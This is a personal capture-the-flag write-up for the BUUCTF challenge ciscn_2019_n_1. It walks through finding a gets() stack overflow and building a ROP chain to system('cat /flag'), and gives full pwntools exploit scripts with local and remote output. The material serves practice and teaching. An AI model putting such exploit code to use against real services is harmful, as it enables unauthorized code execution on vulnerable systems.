# 4. ciscn_2019_n_1

Normal execution

```python
wayell@wayell:~/Desktop/CTF/BUUCTF/pwn/4.ciscn_2019_n_1$ ./ciscn_2019_n_1 
Let's guess the number.
1
Its value should be 11.28125
```

Strings

We have cat /flag which suggests needing to find a func or exec system with that string

```python
wayell@wayell:~/Desktop/CTF/BUUCTF/pwn/4.ciscn_2019_n_1$ rabin2 -z ciscn_2019_n_1 
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x000007b4 0x004007b4 23  24   .rodata ascii Let's guess the number.
1   0x000007cc 0x004007cc 9   10   .rodata ascii cat /flag
2   0x000007d6 0x004007d6 28  29   .rodata ascii Its value should be 11.28125
```

ltrace

gets()

```python
wayell@wayell:~/Desktop/CTF/BUUCTF/pwn/4.ciscn_2019_n_1$ ltrace ./ciscn_2019_n_1
__libc_start_main(0x4006dc, 1, 0x7ffe1ef70a08, 0x400730 <unfinished ...>
setvbuf(0x7fca0434a6a0, 0, 2, 0)                                                                    = 0
setvbuf(0x7fca04349980, 0, 2, 0)                                                                    = 0
puts("Let's guess the number."Let's guess the number.
)                                                                     = 24
gets(0x7ffe1ef708d0, 0x7fca0434a723, 0, 0x7fca0426b0771
)                                             = 0x7ffe1ef708d0
puts("Its value should be 11.28125"Its value should be 11.28125
)                                                                = 29
+++ exited (status 0) +++
```

Functions

main, func, we also have system@plt

```python
pwndbg> info func
All defined functions:

Non-debugging symbols:
0x00000000004004e8  _init
0x0000000000400520  puts@plt
0x0000000000400530  system@plt
0x0000000000400540  __libc_start_main@plt
0x0000000000400550  gets@plt
0x0000000000400560  setvbuf@plt
0x0000000000400570  __gmon_start__@plt
0x0000000000400580  _start
0x00000000004005b0  deregister_tm_clones
0x00000000004005f0  register_tm_clones
0x0000000000400630  __do_global_dtors_aux
0x0000000000400650  frame_dummy
0x0000000000400676  func
0x00000000004006dc  main
0x0000000000400730  __libc_csu_init
0x00000000004007a0  __libc_csu_fini
0x00000000004007a4  _fini
```

checksec

NX is enabled so we cannot inject our own shellcode

```python
pwndbg> checksec
[*] '/home/wayell/Desktop/CTF/BUUCTF/pwn/4.ciscn_2019_n_1/ciscn_2019_n_1'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

disassembly

main just calls func

func runs the code in our normal execution, comparison happens around ucomiss

[https://stackoverflow.com/questions/28182827/useless-jp-jnp-assembly-instruction-on-x86-64](https://stackoverflow.com/questions/28182827/useless-jp-jnp-assembly-instruction-on-x86-64)

maybe possible to solve with just overwrite ret with 0x00000000004006be, since no ASLR

maybe rop, todo

```python
pwndbg> disass main
Dump of assembler code for function main:
   0x00000000004006dc <+0>:	push   rbp
   0x00000000004006dd <+1>:	mov    rbp,rsp
   0x00000000004006e0 <+4>:	mov    rax,QWORD PTR [rip+0x200969]        # 0x601050 <stdout@@GLIBC_2.2.5>
   0x00000000004006e7 <+11>:	mov    ecx,0x0
   0x00000000004006ec <+16>:	mov    edx,0x2
   0x00000000004006f1 <+21>:	mov    esi,0x0
   0x00000000004006f6 <+26>:	mov    rdi,rax
   0x00000000004006f9 <+29>:	call   0x400560 <setvbuf@plt>
   0x00000000004006fe <+34>:	mov    rax,QWORD PTR [rip+0x20095b]        # 0x601060 <stdin@@GLIBC_2.2.5>
   0x0000000000400705 <+41>:	mov    ecx,0x0
   0x000000000040070a <+46>:	mov    edx,0x2
   0x000000000040070f <+51>:	mov    esi,0x0
   0x0000000000400714 <+56>:	mov    rdi,rax
   0x0000000000400717 <+59>:	call   0x400560 <setvbuf@plt>
   0x000000000040071c <+64>:	mov    eax,0x0
   0x0000000000400721 <+69>:	call   0x400676 <func>
   0x0000000000400726 <+74>:	mov    eax,0x0
   0x000000000040072b <+79>:	pop    rbp
   0x000000000040072c <+80>:	ret    
End of assembler dump.
pwndbg> disass func
Dump of assembler code for function func:
   0x0000000000400676 <+0>:	push   rbp
   0x0000000000400677 <+1>:	mov    rbp,rsp
   0x000000000040067a <+4>:	sub    rsp,0x30
   0x000000000040067e <+8>:	pxor   xmm0,xmm0
   0x0000000000400682 <+12>:	movss  DWORD PTR [rbp-0x4],xmm0
   0x0000000000400687 <+17>:	mov    edi,0x4007b4
   0x000000000040068c <+22>:	call   0x400520 <puts@plt>
   0x0000000000400691 <+27>:	lea    rax,[rbp-0x30]
   0x0000000000400695 <+31>:	mov    rdi,rax
   0x0000000000400698 <+34>:	mov    eax,0x0
   0x000000000040069d <+39>:	call   0x400550 <gets@plt>
   0x00000000004006a2 <+44>:	movss  xmm0,DWORD PTR [rbp-0x4]
   0x00000000004006a7 <+49>:	ucomiss xmm0,DWORD PTR [rip+0x146]        # 0x4007f4
   0x00000000004006ae <+56>:	jp     0x4006cf <func+89>
   0x00000000004006b0 <+58>:	movss  xmm0,DWORD PTR [rbp-0x4]
   0x00000000004006b5 <+63>:	ucomiss xmm0,DWORD PTR [rip+0x138]        # 0x4007f4
   0x00000000004006bc <+70>:	jne    0x4006cf <func+89>
   0x00000000004006be <+72>:	mov    edi,0x4007cc
   0x00000000004006c3 <+77>:	mov    eax,0x0
   0x00000000004006c8 <+82>:	call   0x400530 <system@plt>
   0x00000000004006cd <+87>:	jmp    0x4006d9 <func+99>
   0x00000000004006cf <+89>:	mov    edi,0x4007d6
   0x00000000004006d4 <+94>:	call   0x400520 <puts@plt>
   0x00000000004006d9 <+99>:	nop
   0x00000000004006da <+100>:	leave  
   0x00000000004006db <+101>:	ret    
End of assembler dump.
```

offset 56

```python
pwndbg> r
Starting program: /home/wayell/Desktop/CTF/BUUCTF/pwn/4.ciscn_2019_n_1/ciscn_2019_n_1 
Let's guess the number.
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
Its value should be 11.28125

Program received signal SIGSEGV, Segmentation fault.
0x00000000004006db in func ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────────────────────────────────────
 RAX  0x1d
 RBX  0x400730 (__libc_csu_init) ◂— push   r15
 RCX  0x7ffff7ec9077 (write+23) ◂— cmp    rax, -0x1000 /* 'H=' */
 RDX  0x0
 RDI  0x7ffff7fa97e0 (_IO_stdfile_1_lock) ◂— 0x0
 RSI  0x7ffff7fa8723 (_IO_2_1_stdout_+131) ◂— 0xfa97e0000000000a /* '\n' */
 R8   0x1d
 R9   0x0
 R10  0xfffffffffffff3b4
 R11  0x246
 R12  0x400580 (_start) ◂— xor    ebp, ebp
 R13  0x7fffffffdfe0 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x6161616e6161616d ('maaanaaa')
 RSP  0x7fffffffdee8 ◂— 'oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
 RIP  0x4006db (func+101) ◂— ret    
────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────
   0x4006cf <func+89>     mov    edi, 0x4007d6
   0x4006d4 <func+94>     call   puts@plt                      <puts@plt>
 
   0x4006d9 <func+99>     nop    
   0x4006da <func+100>    leave  
 ► 0x4006db <func+101>    ret    <0x616161706161616f>

─────────────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffdee8 ◂— 'oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
01:0008│     0x7fffffffdef0 ◂— 'qaaaraaasaaataaauaaavaaawaaaxaaayaaa'
02:0010│     0x7fffffffdef8 ◂— 'saaataaauaaavaaawaaaxaaayaaa'
03:0018│     0x7fffffffdf00 ◂— 'uaaavaaawaaaxaaayaaa'
04:0020│     0x7fffffffdf08 ◂— 'waaaxaaayaaa'
05:0028│     0x7fffffffdf10 ◂— 0x61616179 /* 'yaaa' */
06:0030│     0x7fffffffdf18 —▸ 0x4006dc (main) ◂— push   rbp
07:0038│     0x7fffffffdf20 —▸ 0x400730 (__libc_csu_init) ◂— push   r15
───────────────────────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────────────────────
 ► f 0         0x4006db func+101
   f 1 0x616161706161616f
   f 2 0x6161617261616171
   f 3 0x6161617461616173
   f 4 0x6161617661616175
   f 5 0x6161617861616177
   f 6       0x61616179
   f 7         0x4006dc main
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> x/xw $rsp
0x7fffffffdee8:	0x6161616f
pwndbg> cyclic -l 0x6161616f
56
```

address of system

```python
pwndbg> p system
$1 = {<text variable, no debug info>} 0x400530 <system@plt>
```

Since we have system, we can try to look for a pop gadget so we can overwrite rdi to hold the string which we found earlier, “cat /flag”

```python
wayell@wayell:~/Desktop/CTF/BUUCTF/pwn/4.ciscn_2019_n_1$ ropper -f ciscn_2019_n_1 --search "pop rdi"
[INFO] Load gadgets for section: PHDR
[LOAD] loading... 100%
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: ciscn_2019_n_1
0x0000000000400793: pop rdi; ret;
```

Afterwards we can craft our payload

Local exploit

```python
from pwn import *

# Set up pwntools to work with this binary
elf = context.binary = ELF('ciscn_2019_n_1')
#p = remote('node4.buuoj.cn',29643)
p = process()

# Number of padding bytes (to offset RIP)
padding = 56

# Crafting payload, contains x nops of padding, ret, address to jump
payload = flat(
	asm('nop') * padding,
	next(elf.search(asm('ret'))),
	p64(0x0000000000400793),
	p64(0x004007cc),
	p64(0x400530)
)

# Writing payload to file on same directory
f = open("payload", "wb")
f.write(payload)

p.recvline()

p.sendline(payload)

p.interactive()
```

Local exec

```python
wayell@wayell:~/Desktop/CTF/BUUCTF/pwn/4.ciscn_2019_n_1$ python3 solve.py 
[*] '/home/wayell/Desktop/CTF/BUUCTF/pwn/4.ciscn_2019_n_1/ciscn_2019_n_1'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/home/wayell/Desktop/CTF/BUUCTF/pwn/4.ciscn_2019_n_1/ciscn_2019_n_1': pid 203202
[*] Switching to interactive mode
Its value should be 11.28125
flag{fakeflag}
```

Remote exploit

```python
from pwn import *

# Set up pwntools to work with this binary
elf = context.binary = ELF('ciscn_2019_n_1')
p = remote('node4.buuoj.cn',29809)
#p = process()

# Number of padding bytes (to offset RIP)
padding = 56

# Crafting payload, contains x nops of padding, ret, address to jump
payload = flat(
	asm('nop') * padding,
	next(elf.search(asm('ret'))),
	p64(0x0000000000400793),
	p64(0x004007cc),
	p64(0x400530)
)

# Writing payload to file on same directory
f = open("payload", "wb")
f.write(payload)

p.recvline()

p.sendline(payload)

p.interactive()
```

Remote exec

```python
wayell@wayell:~/Desktop/CTF/BUUCTF/pwn/4.ciscn_2019_n_1$ python3 solve.py 
[*] '/home/wayell/Desktop/CTF/BUUCTF/pwn/4.ciscn_2019_n_1/ciscn_2019_n_1'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to node4.buuoj.cn on port 29809: Done
[*] Switching to interactive mode
Its value should be 11.28125
flag{373bb8e4-f7d9-44c5-8f4f-858390b04237}
timeout: the monitored command dumped core
[*] Got EOF while reading in interactive
```

---

Intended solution is variable overwrite

[https://blog.csdn.net/qq_41560595/article/details/108783758](https://blog.csdn.net/qq_41560595/article/details/108783758)

Todo!